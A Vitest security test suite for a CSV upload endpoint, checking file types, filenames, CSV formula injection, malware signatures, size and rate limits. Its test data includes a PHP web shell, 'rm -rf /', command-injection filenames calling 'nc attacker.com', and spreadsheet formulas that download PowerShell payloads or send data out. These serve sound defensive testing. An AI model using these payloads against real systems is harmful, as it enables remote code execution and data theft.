/**
 * File Upload Security Tests
 * Tests for secure file upload handling and validation
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { unstable_dev } from 'wrangler';
import type { UnstableDevWorker } from 'wrangler';
import { testEnv } from '../setup/test-env';

describe('File Upload Security Tests', () => {
  let worker: UnstableDevWorker;
  let env: any;
  let authToken: string;

  beforeEach(async () => {
    env = await testEnv();
    worker = await unstable_dev('src/index.ts', {
      experimental: { disableExperimentalWarning: true },
    });

    // Set up authenticated user for tests
    await worker.fetch('/api/accounts/register', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: 'upload_test_user',
        password: 'SecurePass123!',
        email: 'upload@test.com'
      })
    });

    const loginResponse = await worker.fetch('/api/accounts/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: 'upload_test_user',
        password: 'SecurePass123!'
      })
    });

    const { access_token } = await loginResponse.json();
    authToken = access_token;
  });

  describe('File Type Validation', () => {
    it('should reject non-CSV file types', async () => {
      const maliciousFiles = [
        { content: '<script>alert("XSS")</script>', type: 'text/html', name: 'malicious.html' },
        { content: 'alert("XSS")', type: 'application/javascript', name: 'malicious.js' },
        { content: '<?php system($_GET["cmd"]); ?>', type: 'application/x-php', name: 'shell.php' },
        { content: '#!/bin/bash\nrm -rf /', type: 'application/x-sh', name: 'malicious.sh' },
        { content: 'MZ\x90\x00...', type: 'application/x-msdownload', name: 'malware.exe' },
        { content: '\x7fELF...', type: 'application/x-executable', name: 'malware.bin' },
        { content: 'PK\x03\x04...', type: 'application/zip', name: 'archive.zip' },
        { content: '%PDF-1.4...', type: 'application/pdf', name: 'document.pdf' },
        { content: 'PK\x03\x04...', type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', name: 'spreadsheet.xlsx' },
        { content: '\x89PNG...', type: 'image/png', name: 'image.png' },
        { content: '\xff\xd8\xff...', type: 'image/jpeg', name: 'image.jpg' },
        { content: 'GIF89a...', type: 'image/gif', name: 'image.gif' },
        { content: 'RIFF...WEBP', type: 'image/webp', name: 'image.webp' },
        { content: '<svg>...</svg>', type: 'image/svg+xml', name: 'image.svg' },
        { content: 'ID3...', type: 'audio/mpeg', name: 'audio.mp3' },
        { content: 'OggS...', type: 'audio/ogg', name: 'audio.ogg' },
        { content: 'ftyp...', type: 'video/mp4', name: 'video.mp4' },
        { content: 'WEBM...', type: 'video/webm', name: 'video.webm' }
      ];

      for (const file of maliciousFiles) {
        const formData = new FormData();
        formData.append('file', new Blob([file.content], { type: file.type }), file.name);

        const response = await worker.fetch('/api/list_cutter/upload', {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${authToken}`
          },
          body: formData
        });

        expect(response.status).toBe(400);
        const body = await response.json();
        expect(body.error).toContain('file type');
      }
    });

    it('should reject files with double extensions', async () => {
      const doubleExtensionFiles = [
        'document.pdf.csv',
        'script.js.csv',
        'malware.exe.csv',
        'shell.php.csv',
        'archive.zip.csv',
        'image.png.csv',
        'video.mp4.csv',
        'audio.mp3.csv',
        'file.csv.exe',
        'file.csv.php',
        'file.csv.js',
        'file.csv.html'
      ];

      const csvContent = 'name,age\nJohn,25';
      
      for (const filename of doubleExtensionFiles) {
        const formData = new FormData();
        formData.append('file', new Blob([csvContent], { type: 'text/csv' }), filename);

        const response = await worker.fetch('/api/list_cutter/upload', {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${authToken}`
          },
          body: formData
        });

        expect(response.status).toBe(400);
        const body = await response.json();
        expect(body.error).toContain('extension');
      }
    });

    it('should validate file content matches declared type', async () => {
      // HTML content with CSV extension
      const htmlAsCSV = new FormData();
      htmlAsCSV.append('file', new Blob(['<html><script>alert("XSS")</script></html>'], { type: 'text/csv' }), 'fake.csv');

      let response = await worker.fetch('/api/list_cutter/upload', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${authToken}`
        },
        body: htmlAsCSV
      });

      expect(response.status).toBe(400);

      // JavaScript content with CSV extension
      const jsAsCSV = new FormData();
      jsAsCSV.append('file', new Blob(['function malicious() { alert("XSS"); }'], { type: 'text/csv' }), 'fake.csv');

      response = await worker.fetch('/api/list_cutter/upload', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${authToken}`
        },
        body: jsAsCSV
      });

      expect(response.status).toBe(400);

      // Binary executable with CSV extension
      const binaryAsCSV = new FormData();
      binaryAsCSV.append('file', new Blob([new Uint8Array([0x7f, 0x45, 0x4c, 0x46])], { type: 'text/csv' }), 'fake.csv');

      response = await worker.fetch('/api/list_cutter/upload', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${authToken}`
        },
        body: binaryAsCSV
      });

      expect(response.status).toBe(400);
    });

    it('should detect and reject polyglot files', async () => {
      // File that could be interpreted as both CSV and HTML
      const polyglotContent = `<!--<script>alert("XSS")</script>-->
name,age,description
John,25,"Normal data"
Jane,30,"<img src=x onerror=alert('XSS')>"`;

      const formData = new FormData();
      formData.append('file', new Blob([polyglotContent], { type: 'text/csv' }), 'polyglot.csv');

      const response = await worker.fetch('/api/list_cutter/upload', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${authToken}`
        },
        body: formData
      });

      // Should either reject or sanitize the content
      if (response.status === 200) {
        const body = await response.json();
        // If accepted, verify dangerous content is removed
        expect(body.preview).not.toContain('<script>');
        expect(body.preview).not.toContain('<!--');
        expect(body.preview).not.toContain('<img');
        expect(body.preview).not.toContain('onerror=');
      } else {
        expect(response.status).toBe(400);
      }
    });
  });

  describe('File Size Limits', () => {
    it('should reject files exceeding size limit', async () => {
      // Create a file larger than the expected limit (assume 10MB limit)
      const largeContent = 'a'.repeat(11 * 1024 * 1024); // 11MB
      const formData = new FormData();
      formData.append('file', new Blob([largeContent], { type: 'text/csv' }), 'large.csv');

      const response = await worker.fetch('/api/list_cutter/upload', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${authToken}`
        },
        body: formData
      });

      expect(response.status).toBe(413); // Payload Too Large
      const body = await response.json();
      expect(body.error).toContain('size');
    });

    it('should accept files within size limit', async () => {
      // Create a file within the expected limit
      const validContent = 'name,age\nJohn,25\nJane,30';
      const formData = new FormData();
      formData.append('file', new Blob([validContent], { type: 'text/csv' }), 'valid.csv');

      const response = await worker.fetch('/api/list_cutter/upload', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${authToken}`
        },
        body: formData
      });

      expect(response.status).toBe(200);
    });

    it('should handle malicious size headers', async () => {
      const content = 'name,age\nJohn,25';
      const formData = new FormData();
      formData.append('file', new Blob([content], { type: 'text/csv' }), 'test.csv');

      const response = await worker.fetch('/api/list_cutter/upload', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${authToken}`,
          'Content-Length': '999999999999' // Malicious content length
        },
        body: formData
      });

      // Should handle gracefully, not crash
      expect(response.status).toBeOneOf([200, 400, 413]);
    });
  });

  describe('Filename Security', () => {
    it('should sanitize dangerous filenames', async () => {
      const dangerousFilenames = [
        'CON.csv', // Windows reserved name
        'PRN.csv',
        'AUX.csv',
        'NUL.csv',
        'COM1.csv',
        'LPT1.csv',
        'file\x00.csv', // Null byte
        'file\r\n.csv', // CRLF injection
        'file\t.csv', // Tab character
        'file .csv', // Trailing space
        'file..csv', // Double dot
        '.htaccess.csv', // Hidden file
        '..\\..\\windows\\system32\\config\\sam.csv', // Path traversal
        '../../../etc/passwd.csv',
        'file.csv;rm -rf /', // Command injection
        'file.csv && cat /etc/passwd',
        'file.csv`whoami`',
        'file.csv$(whoami)',
        'file.csv|nc attacker.com 80',
        'file.csv\x20\x20\x20\x20\x20.exe', // Spaces + hidden extension
        'file.csv:Zone.Identifier', // NTFS alternate data stream
        'file.csv::$DATA',
        '~$file.csv', // Office temp file
        'Thumbs.db.csv', // Windows system file
        '.DS_Store.csv', // macOS system file
        'desktop.ini.csv'
      ];

      const csvContent = 'name,age\nJohn,25';
      
      for (const filename of dangerousFilenames) {
        const formData = new FormData();
        formData.append('file', new Blob([csvContent], { type: 'text/csv' }), filename);

        const response = await worker.fetch('/api/list_cutter/upload', {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${authToken}`
          },
          body: formData
        });

        if (response.status === 200) {
          const body = await response.json();
          // Filename should be sanitized
          expect(body.filename).not.toContain('\x00');
          expect(body.filename).not.toContain('\r');
          expect(body.filename).not.toContain('\n');
          expect(body.filename).not.toContain('\t');
          expect(body.filename).not.toContain('../');
          expect(body.filename).not.toContain('..\\');
          expect(body.filename).not.toContain(';');
          expect(body.filename).not.toContain('&');
          expect(body.filename).not.toContain('|');
          expect(body.filename).not.toContain('`');
          expect(body.filename).not.toContain('$');
          expect(body.filename).not.toContain(':');
          expect(body.filename).not.toMatch(/^(CON|PRN|AUX|NUL|COM[1-9]|LPT[1-9])$/i);
          expect(body.filename).not.toStartWith('.');
          expect(body.filename).not.toEndWith(' ');
          expect(body.filename).not.toContain('..');
        } else {
          // Alternatively, should reject dangerous filenames
          expect(response.status).toBe(400);
        }
      }
    });

    it('should prevent filename length attacks', async () => {
      const longFilename = 'a'.repeat(1000) + '.csv';
      const csvContent = 'name,age\nJohn,25';
      
      const formData = new FormData();
      formData.append('file', new Blob([csvContent], { type: 'text/csv' }), longFilename);

      const response = await worker.fetch('/api/list_cutter/upload', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${authToken}`
        },
        body: formData
      });

      if (response.status === 200) {
        const body = await response.json();
        // Filename should be truncated to reasonable length
        expect(body.filename.length).toBeLessThan(255);
        expect(body.filename).toEndWith('.csv');
      } else {
        expect(response.status).toBe(400);
      }
    });

    it('should handle Unicode filename attacks', async () => {
      const unicodeFilenames = [
        'file\u202eFSCv.exe', // Right-to-left override
        'file\u200d.csv', // Zero width joiner
        'file\u200c.csv', // Zero width non-joiner
        'file\u200b.csv', // Zero width space
        'file\ufeff.csv', // Byte order mark
        'file\u2060.csv', // Word joiner
        'file\u180e.csv', // Mongolian vowel separator
        'file\u061c.csv', // Arabic letter mark
        'filе.csv', // Cyrillic 'е' instead of 'e'
        'file.сsv', // Cyrillic 'с' instead of 'c'
        'file.csv\u0000.exe' // Null byte
      ];

      const csvContent = 'name,age\nJohn,25';
      
      for (const filename of unicodeFilenames) {
        const formData = new FormData();
        formData.append('file', new Blob([csvContent], { type: 'text/csv' }), filename);

        const response = await worker.fetch('/api/list_cutter/upload', {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${authToken}`
          },
          body: formData
        });

        if (response.status === 200) {
          const body = await response.json();
          // Should normalize or reject problematic Unicode
          expect(body.filename).not.toContain('\u202e');
          expect(body.filename).not.toContain('\u200d');
          expect(body.filename).not.toContain('\u200c');
          expect(body.filename).not.toContain('\u200b');
          expect(body.filename).not.toContain('\ufeff');
          expect(body.filename).not.toContain('\u0000');
        }
      }
    });
  });

  describe('Content Validation', () => {
    it('should validate CSV structure', async () => {
      const invalidCSVs = [
        '', // Empty file
        'no,headers\n', // No data rows
        'header1\ndata1,data2', // Inconsistent columns
        'header1,header2\ndata1', // Missing columns
        'header1,header2\ndata1,data2,data3', // Extra columns
        '"unclosed quote,header2\ndata1,data2', // Malformed quotes
        'header1,header2\n"unclosed,data2', // Unclosed quotes in data
        'header1,header2\ndata1,"data2\ndata3,data4', // Newline in quoted field
        'header1,header2\ndata1,data2\ndata3', // Inconsistent row length
        '\x00\x01\x02\x03', // Binary data
        'header1,header2\ndata1,\x00data2', // Null bytes in data
        'header1,header2\ndata1,data2\r\n\r\n\r\n', // Extra blank lines
        'header1,header2,header3,header4,header5,header6,header7,header8,header9,header10,header11,header12,header13,header14,header15,header16,header17,header18,header19,header20,header21,header22,header23,header24,header25,header26,header27,header28,header29,header30,header31,header32,header33,header34,header35,header36,header37,header38,header39,header40,header41,header42,header43,header44,header45,header46,header47,header48,header49,header50,header51,header52,header53,header54,header55,header56,header57,header58,header59,header60,header61,header62,header63,header64,header65,header66,header67,header68,header69,header70,header71,header72,header73,header74,header75,header76,header77,header78,header79,header80,header81,header82,header83,header84,header85,header86,header87,header88,header89,header90,header91,header92,header93,header94,header95,header96,header97,header98,header99,header100\ndata1,data2,data3,data4,data5,data6,data7,data8,data9,data10,data11,data12,data13,data14,data15,data16,data17,data18,data19,data20,data21,data22,data23,data24,data25,data26,data27,data28,data29,data30,data31,data32,data33,data34,data35,data36,data37,data38,data39,data40,data41,data42,data43,data44,data45,data46,data47,data48,data49,data50,data51,data52,data53,data54,data55,data56,data57,data58,data59,data60,data61,data62,data63,data64,data65,data66,data67,data68,data69,data70,data71,data72,data73,data74,data75,data76,data77,data78,data79,data80,data81,data82,data83,data84,data85,data86,data87,data88,data89,data90,data91,data92,data93,data94,data95,data96,data97,data98,data99,data100' // Too many columns
      ];

      for (const csvContent of invalidCSVs) {
        const formData = new FormData();
        formData.append('file', new Blob([csvContent], { type: 'text/csv' }), 'invalid.csv');

        const response = await worker.fetch('/api/list_cutter/upload', {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${authToken}`
          },
          body: formData
        });

        expect(response.status).toBe(400);
        const body = await response.json();
        expect(body.error).toBeDefined();
      }
    });

    it('should detect and prevent CSV injection', async () => {
      const csvInjectionPayloads = [
        `=cmd|'/c calc'!A0`,
        `=1+1+cmd|'/c calc'!A0`,
        `@SUM(1+1)*cmd|'/c calc'!A0`,
        `+cmd|'/c calc'!A0`,
        `-cmd|'/c calc'!A0`,
        `=1+1+cmd|'/c powershell IEX(wget 0r.pe/p)'!A0`,
        `=2+5+cmd|'/c powershell -windowstyle hidden -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://attacker.com/payload.ps1')"'!A0`,
        `=HYPERLINK("http://attacker.com/steal?data="&A1)`,
        `=HYPERLINK("file:///etc/passwd")`,
        `=IMPORTXML("http://attacker.com/xxe.xml", "//data")`,
        `=IMPORTDATA("http://attacker.com/steal.csv")`,
        `=QUERY("http://attacker.com/data", "SELECT *")`,
        `"=cmd|'/c calc'!A0"`,
        `'=cmd|'/c calc'!A0'`
      ];

      for (const payload of csvInjectionPayloads) {
        const csvContent = `name,age,formula\nJohn,25,"${payload}"`;
        const formData = new FormData();
        formData.append('file', new Blob([csvContent], { type: 'text/csv' }), 'injection.csv');

        const response = await worker.fetch('/api/list_cutter/upload', {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${authToken}`
          },
          body: formData
        });

        if (response.status === 200) {
          const body = await response.json();
          // Should escape or reject formula injections
          expect(body.preview).not.toContain('=cmd');
          expect(body.preview).not.toContain('=HYPERLINK');
          expect(body.preview).not.toContain('=IMPORTXML');
          expect(body.preview).not.toContain('=IMPORTDATA');
          expect(body.preview).not.toContain('=QUERY');
          expect(body.preview).not.toContain('+cmd');
          expect(body.preview).not.toContain('-cmd');
          expect(body.preview).not.toContain('@SUM');
        }
      }
    });

    it('should limit CSV row and column counts', async () => {
      // Test excessive number of rows
      const manyRows = ['name,age'];
      for (let i = 0; i < 100000; i++) {
        manyRows.push(`User${i},${20 + (i % 50)}`);
      }
      
      let formData = new FormData();
      formData.append('file', new Blob([manyRows.join('\n')], { type: 'text/csv' }), 'many_rows.csv');

      let response = await worker.fetch('/api/list_cutter/upload', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${authToken}`
        },
        body: formData
      });

      expect(response.status).toBeOneOf([200, 400, 413]);

      // Test excessive number of columns
      const manyCols = Array.from({ length: 1000 }, (_, i) => `col${i}`);
      const csvContent = `${manyCols.join(',')}\n${Array.from({ length: 1000 }, (_, i) => `data${i}`).join(',')}`;
      
      formData = new FormData();
      formData.append('file', new Blob([csvContent], { type: 'text/csv' }), 'many_cols.csv');

      response = await worker.fetch('/api/list_cutter/upload', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${authToken}`
        },
        body: formData
      });

      expect(response.status).toBeOneOf([200, 400, 413]);
    });
  });

  describe('Rate Limiting', () => {
    it('should implement upload rate limiting', async () => {
      const csvContent = 'name,age\nJohn,25';
      const promises = [];

      // Attempt rapid uploads
      for (let i = 0; i < 20; i++) {
        const formData = new FormData();
        formData.append('file', new Blob([csvContent], { type: 'text/csv' }), `rapid${i}.csv`);

        promises.push(
          worker.fetch('/api/list_cutter/upload', {
            method: 'POST',
            headers: {
              'Authorization': `Bearer ${authToken}`
            },
            body: formData
          })
        );
      }

      const responses = await Promise.all(promises);
      const rateLimitedResponses = responses.filter(r => r.status === 429);

      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    it('should implement per-user upload quotas', async () => {
      const largeContent = 'name,age\n' + Array.from({ length: 10000 }, (_, i) => `User${i},${20 + i}`).join('\n');
      
      const uploads = [];
      for (let i = 0; i < 10; i++) {
        const formData = new FormData();
        formData.append('file', new Blob([largeContent], { type: 'text/csv' }), `quota${i}.csv`);

        uploads.push(
          worker.fetch('/api/list_cutter/upload', {
            method: 'POST',
            headers: {
              'Authorization': `Bearer ${authToken}`
            },
            body: formData
          })
        );
      }

      const responses = await Promise.all(uploads);
      const quotaExceededResponses = responses.filter(r => r.status === 413 || (r.status === 400 && r.statusText?.includes('quota')));

      // Should eventually hit quota limits
      expect(quotaExceededResponses.length).toBeGreaterThan(0);
    });
  });

  describe('Virus/Malware Detection', () => {
    it('should detect EICAR test signatures', async () => {
      // EICAR test strings (standard antivirus test)
      const eicarStrings = [
        'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*',
        'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\0',
        '44495243415A', // Hex encoded
        'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUV' // Base64 encoded
      ];

      for (const eicar of eicarStrings) {
        const csvContent = `name,age,data\nTest,25,"${eicar}"`;
        const formData = new FormData();
        formData.append('file', new Blob([csvContent], { type: 'text/csv' }), 'eicar.csv');

        const response = await worker.fetch('/api/list_cutter/upload', {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${authToken}`
          },
          body: formData
        });

        // Should either reject or quarantine
        expect(response.status).toBeOneOf([400, 403]);
        
        if (response.status === 400 || response.status === 403) {
          const body = await response.json();
          expect(body.error).toMatch(/virus|malware|threat|security/i);
        }
      }
    });

    it('should detect suspicious binary patterns', async () => {
      const suspiciousPatterns = [
        new Uint8Array([0x4d, 0x5a]), // MZ header (Windows PE)
        new Uint8Array([0x7f, 0x45, 0x4c, 0x46]), // ELF header (Linux executable)
        new Uint8Array([0xca, 0xfe, 0xba, 0xbe]), // Mach-O header (macOS executable)
        new Uint8Array([0x50, 0x4b, 0x03, 0x04]), // ZIP header
        new Uint8Array([0x52, 0x61, 0x72, 0x21]), // RAR header
        new Uint8Array([0x1f, 0x8b]), // GZIP header
        new Uint8Array([0x42, 0x5a, 0x68]), // BZIP2 header
        new Uint8Array([0xff, 0xd8, 0xff]), // JPEG header (suspicious in CSV context)
        new Uint8Array([0x89, 0x50, 0x4e, 0x47]), // PNG header
        new Uint8Array([0x47, 0x49, 0x46, 0x38]), // GIF header
        new Uint8Array([0x25, 0x50, 0x44, 0x46]) // PDF header
      ];

      for (const pattern of suspiciousPatterns) {
        const content = new Uint8Array(pattern.length + 20);
        content.set(pattern, 0);
        content.set(new TextEncoder().encode('\nname,age\nJohn,25'), pattern.length);

        const formData = new FormData();
        formData.append('file', new Blob([content], { type: 'text/csv' }), 'suspicious.csv');

        const response = await worker.fetch('/api/list_cutter/upload', {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${authToken}`
          },
          body: formData
        });

        expect(response.status).toBe(400);
      }
    });
  });

  describe('Compression Bomb Protection', () => {
    it('should detect decompression bombs', async () => {
      // Simulate highly repetitive content that could indicate a compression bomb
      const repetitiveContent = 'A'.repeat(100000);
      const csvWithBomb = `name,age,data\nTest,25,"${repetitiveContent}"`;

      const formData = new FormData();
      formData.append('file', new Blob([csvWithBomb], { type: 'text/csv' }), 'bomb.csv');

      const response = await worker.fetch('/api/list_cutter/upload', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${authToken}`
        },
        body: formData
      });

      // Should handle large repetitive content safely
      expect(response.status).toBeOneOf([200, 400, 413]);
      
      if (response.status === 200) {
        const body = await response.json();
        // Should not crash or consume excessive resources
        expect(body.filename).toBeDefined();
      }
    });

    it('should limit processing time for complex files', async () => {
      // Create a CSV with complex nested quotes that could cause exponential parsing time
      const complexContent = 'name,description\n' + Array.from({ length: 1000 }, (_, i) => 
        `User${i},"${'"'.repeat(100)}data${'"'.repeat(100)}"`
      ).join('\n');

      const formData = new FormData();
      formData.append('file', new Blob([complexContent], { type: 'text/csv' }), 'complex.csv');

      const startTime = Date.now();
      const response = await worker.fetch('/api/list_cutter/upload', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${authToken}`
        },
        body: formData
      });
      const endTime = Date.now();

      // Should not take too long to process
      expect(endTime - startTime).toBeLessThan(30000); // 30 seconds max
      expect(response.status).toBeOneOf([200, 400, 408]);
    });
  });

  afterEach(async () => {
    await worker.stop();
  });
});